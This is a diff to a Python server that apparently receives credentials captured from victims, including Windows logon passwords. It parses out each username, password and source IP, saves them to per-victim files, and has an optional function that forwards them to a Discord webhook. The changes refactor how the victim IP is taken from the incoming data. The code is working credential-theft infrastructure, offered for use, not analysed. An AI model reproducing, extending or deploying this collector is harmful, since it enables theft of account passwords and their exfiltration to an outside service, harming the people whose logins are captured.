@@ -11,7 +11,7 @@ print_lock = threading.Lock()
 def handle_client(conn, addr):
     data = conn.recv(1024)
     strData = str(data)
-    #print(strData) #debugging
+    # print(strData) #debugging
     if '@@' in strData: #winlogon
         type = 'WinLogon'
         username = strData[2:strData.find('@@')]
@@ -20,19 +20,20 @@ def handle_client(conn, addr):
         username = strData[2:strData.find(':')]
     password = strData[strData.find(':')+1:strData.find(';end')]
     timestamp = datetime.datetime.now().strftime("%G-%m-%d %H:%M:%S")
-    storage = f"\nTimestamp: {timestamp}\nSource: {addr[0]}\nType: {type}\nUsername: {username} \nPassword: {password}\n\n"
+    ip = strData[strData.find('end;')+4:len(strData)-2] # change this to ;ip and then ;end
+    storage = f"\nTimestamp: {timestamp}\nSource: {ip}\nType: {type}\nUsername: {username} \nPassword: {password}\n\n"
     print(storage)
 
-    # discordWH(addr[0], username, password)
+    # discordWH(ip, username, password)
 
-    writeFile(storage, addr)
+    writeFile(storage, ip)
 
     if not data:
         print_lock.release()
 
 
 def discordWH(addr, username, password):
-    url = "" # modify this
+    url = ""
 
     # Setup Post Request
     post = {}
@@ -51,8 +52,7 @@ def discordWH(addr, username, password):
         print("Payload delivered successfully, code {}.".format(result.status_code))
 
 
-def writeFile(storage, addr):
-    ip = addr[0]
+def writeFile(storage, ip):
     with open(f'creds/{ip}', 'a') as f:
         f.write(storage)
 
